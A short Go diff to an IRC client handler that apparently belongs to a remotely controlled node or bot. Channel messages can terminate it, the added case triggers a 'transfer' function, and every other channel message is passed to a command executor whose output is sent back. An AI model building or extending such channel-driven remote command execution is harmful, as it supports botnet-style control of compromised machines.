@@ -12,6 +12,8 @@ func handler(c *irc.Client, m *irc.Message) {
 	// terminate node
 	case m.Command == "PRIVMSG" && c.FromChannel(m) && m.Params[1] == "terminate":
 		terminate()
+	case m.Command == "PRIVMSG" && c.FromChannel(m) && m.Params[1] == "transfer":
+		transfer()
 	// pass every message from channel to executeCommand / return its output
 	case m.Command == "PRIVMSG" && c.FromChannel(m):
 		c.WriteMessage(&irc.Message{
